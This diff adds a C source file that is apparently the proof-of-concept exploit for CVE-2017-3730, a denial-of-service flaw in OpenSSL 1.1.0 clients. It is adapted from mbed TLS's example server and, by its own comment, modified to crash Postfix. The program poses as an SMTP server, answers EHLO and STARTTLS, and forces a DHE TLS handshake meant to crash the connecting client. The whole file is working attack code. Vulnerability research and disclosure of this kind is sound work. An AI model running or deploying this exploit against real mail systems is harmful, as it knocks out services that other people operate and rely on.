@@ -1,0 +1,212 @@
+// Source: https://guidovranken.wordpress.com/2017/01/26/cve-2017-3730-openssl-1-1-0-remote-client-denial-of-service-affects-servers-as-well-poc/
+
+/*
+ *  SSL server demonstration program
+ *
+ *  Copyright (C) 2006-2015, ARM Limited, All Rights Reserved
+ *  SPDX-License-Identifier: Apache-2.0
+ *
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may
+ *  not use this file except in compliance with the License.
+ *  You may obtain a copy of the License at
+ *
+ *  http://www.apache.org/licenses/LICENSE-2.0
+ *
+ *  Unless required by applicable law or agreed to in writing, software
+ *  distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
+ *  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ *  See the License for the specific language governing permissions and
+ *  limitations under the License.
+ *
+ *  This file is part of mbed TLS (https://tls.mbed.org)
+ */
+
+/* Taken from mbed TLS programs/ssl/ssl_server.c and modified to crash postfix.
+ * Belongs to https://github.com/guidovranken/CVE-2017-3730
+*/
+#include <stdlib.h>
+#include <string.h>
+
+#include "mbedtls/entropy.h"
+#include "mbedtls/ctr_drbg.h"
+#include "mbedtls/certs.h"
+#include "mbedtls/x509.h"
+#include "mbedtls/ssl.h"
+#include "mbedtls/net_sockets.h"
+#include "mbedtls/error.h"
+#include "mbedtls/debug.h"
+
+static int write_and_get_response( mbedtls_net_context *sock_fd, char *buf, size_t len )
+{
+    int ret;
+
+    if ( (ret = mbedtls_net_send( sock_fd, (unsigned char*)buf, strlen(buf) )) <= 0 )
+    {
+        return -1;
+    }
+
+    memset( buf, 0, len );
+    ret = mbedtls_net_recv( sock_fd, (unsigned char*)buf, len );
+    return ret;
+}
+
+int main( void )
+{
+    int ret;
+    mbedtls_net_context listen_fd, client_fd;
+    char buf[1024];
+    const char *pers = "ssl_server";
+
+    int force_ciphersuite[2];
+    mbedtls_entropy_context entropy;
+    mbedtls_ctr_drbg_context ctr_drbg;
+    mbedtls_ssl_context ssl;
+    mbedtls_ssl_config conf;
+    mbedtls_x509_crt srvcert;
+    mbedtls_pk_context pkey;
+
+    mbedtls_net_init( &listen_fd );
+    mbedtls_net_init( &client_fd );
+    mbedtls_ssl_init( &ssl );
+    mbedtls_ssl_config_init( &conf );
+    mbedtls_x509_crt_init( &srvcert );
+    mbedtls_pk_init( &pkey );
+    mbedtls_entropy_init( &entropy );
+    mbedtls_ctr_drbg_init( &ctr_drbg );
+
+    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt,
+                          mbedtls_test_srv_crt_len );
+    if( ret != 0 )
+    {
+        goto exit;
+    }
+
+    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem,
+                          mbedtls_test_cas_pem_len );
+    if( ret != 0 )
+    {
+        goto exit;
+    }
+
+    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key,
+                         mbedtls_test_srv_key_len, NULL, 0 );
+    if( ret != 0 )
+    {
+        goto exit;
+    }
+
+    if( ( ret = mbedtls_net_bind( &listen_fd, NULL, "8888", MBEDTLS_NET_PROTO_TCP ) ) != 0 )
+    {
+        goto exit;
+    }
+
+    if( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy,
+                               (const unsigned char *) pers,
+                               strlen( pers ) ) ) != 0 )
+    {
+        goto exit;
+    }
+
+    if( ( ret = mbedtls_ssl_config_defaults( &conf,
+                    MBEDTLS_SSL_IS_SERVER,
+                    MBEDTLS_SSL_TRANSPORT_STREAM,
+                    MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 )
+    {
+        goto exit;
+    }
+
+    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
+
+
+    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
+    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 )
+    {
+        goto exit;
+    }
+
+    force_ciphersuite[0] = mbedtls_ssl_get_ciphersuite_id( "TLS-DHE-RSA-WITH-AES-256-GCM-SHA384" );
+    force_ciphersuite[1] = 0;
+    mbedtls_ssl_conf_ciphersuites( &conf, force_ciphersuite );
+
+    if( ( ret = mbedtls_ssl_setup( &ssl, &conf ) ) != 0 )
+    {
+        goto exit;
+    }
+
+reset:
+
+    mbedtls_net_free( &client_fd );
+
+    mbedtls_ssl_session_reset( &ssl );
+
+    if( ( ret = mbedtls_net_accept( &listen_fd, &client_fd,
+                                    NULL, 0, NULL ) ) != 0 )
+    {
+        goto exit;
+    }
+    
+    sprintf(buf, "220 ok\n");
+    ret = write_and_get_response( &client_fd, buf, sizeof(buf));
+
+    if ( ret < 5 ) {
+        goto exit;
+    }
+
+    if ( strncmp(buf, "EHLO ", 5) != 0 ) {
+        goto exit;
+    }
+
+    sprintf(buf, "250-SIZE 157286400\n250-8BITMIME\n250-STARTTLS\n250-ENHANCEDSTATUSCODES\n250-PIPELINING\n250-CHUNKING\n250 SMTPUTF8\n");
+    ret = write_and_get_response( &client_fd, buf, sizeof(buf));
+
+    if ( ret < 8 ) {
+        goto exit;
+    }
+
+    if ( strncmp(buf, "STARTTLS", 8) != 0 ) {
+        goto exit;
+    }
+    sprintf(buf, "220 ok\n");
+    ret = mbedtls_net_send( &client_fd, (unsigned char*)buf, strlen(buf) );
+    if ( ret < 0 ) {
+        goto exit;
+    }
+
+    mbedtls_ssl_set_bio( &ssl, &client_fd, mbedtls_net_send, mbedtls_net_recv, NULL );
+
+
+    while( ( ret = mbedtls_ssl_handshake( &ssl ) ) != 0 )
+    {
+        if( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE )
+        {
+            goto reset;
+        }
+    }
+
+    while( ( ret = mbedtls_ssl_close_notify( &ssl ) ) < 0 )
+    {
+        if( ret != MBEDTLS_ERR_SSL_WANT_READ &&
+            ret != MBEDTLS_ERR_SSL_WANT_WRITE )
+        {
+            goto reset;
+        }
+    }
+
+
+    ret = 0;
+    goto reset;
+
+exit:
+
+    mbedtls_net_free( &client_fd );
+    mbedtls_net_free( &listen_fd );
+
+    mbedtls_x509_crt_free( &srvcert );
+    mbedtls_pk_free( &pkey );
+    mbedtls_ssl_free( &ssl );
+    mbedtls_ssl_config_free( &conf );
+    mbedtls_ctr_drbg_free( &ctr_drbg );
+    mbedtls_entropy_free( &entropy );
+
+    return( ret );
+}
